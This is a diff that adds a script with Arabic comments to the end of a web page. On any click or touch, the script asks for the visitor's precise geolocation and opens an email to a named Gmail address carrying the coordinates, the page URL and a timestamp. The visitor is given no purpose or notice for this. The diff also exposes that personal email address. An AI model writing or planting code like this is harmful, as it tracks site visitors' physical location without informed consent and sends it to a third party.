@@ -358,4 +358,42 @@
 
     </div>
 </body>
+    <script>
+/* دالة جاهزة من الرد السابق */
+function sendLocationViaMailto() {
+  if (!navigator.geolocation) {
+    alert('المتصفح لا يدعم Geolocation');
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const accuracy = pos.coords.accuracy;
+      const subject = encodeURIComponent('موقع زائر الموقع');
+      const body = encodeURIComponent(
+        `مرحباً Moniem,\n\nقام زائر بالموافقة على مشاركة موقعه.\n\nالإحداثيات:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\n\nالصفحة: ${location.href}\nالتوقيت: ${new Date().toISOString()}`
+      );
+      window.location.href = `mailto:moniemhgagy@gmail.com?subject=${subject}&body=${body}`;
+    },
+    (err) => { alert('فشل الحصول على الموقع: ' + err.message); },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+
+/* الاستماع لأي نقرة أو لمسة في الصفحة */
+(function(){
+  let triggered = false; // لو عايز يسمح مرة واحدة فقط، خلى true بعد التنفيذ
+  function handler(e) {
+    if (triggered) return; // لو عايز يسمح مرة واحدة فقط
+    // لو تريده يتكرر احذف السطرين اللي بتحكم في triggered
+    triggered = true;
+    sendLocationViaMailto();
+  }
+  // يستجيب للنقر واللمس (mobile)
+  document.addEventListener('click', handler, { once: false });
+  document.addEventListener('touchstart', handler, { once: false });
+})();
+</script>
+
 </html>
